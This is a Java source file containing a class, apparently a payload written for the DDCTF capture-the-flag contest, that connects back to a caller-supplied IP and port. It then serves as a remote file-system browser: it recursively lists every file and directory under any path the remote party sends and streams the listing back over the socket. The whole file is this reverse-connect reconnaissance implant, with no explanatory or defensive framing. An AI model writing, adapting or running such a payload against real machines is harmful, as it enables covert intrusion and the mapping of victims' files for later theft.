import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;

public class R {

    public R(String ip, Integer port) {
        new Thread(() -> {
            try {
                Socket socket = new Socket(ip,port);
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                bufferedWriter.write("hello ddctf!");
                bufferedWriter.newLine();
                bufferedWriter.flush();

                BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
                while (true) {
                    String line;
                    while ((line = bufferedReader.readLine()) == null)
                        ;
                    try {
                        v(line.trim(),bufferedWriter);
                    } catch (Exception e) {
                        e.printStackTrace();
                        bufferedWriter.write("文件不存在");
                        bufferedWriter.newLine();
                    }
                    bufferedWriter.flush();
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void v(String dddir,BufferedWriter bufferedWriter) throws IOException {
        Files.walkFileTree(Paths.get(dddir), new SimpleFileVisitor<Path>() {

            @Override
            public FileVisitResult postVisitDirectory(Path dir, IOException exc) {
                try {
                    bufferedWriter.write(dir.toString());
                    bufferedWriter.newLine();
                    bufferedWriter.flush();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return FileVisitResult.CONTINUE;
            }

            @Override
            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                try {
                    bufferedWriter.write(file.toString());
                    bufferedWriter.newLine();
                    bufferedWriter.flush();
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return FileVisitResult.CONTINUE;
            }
        });
    }
}
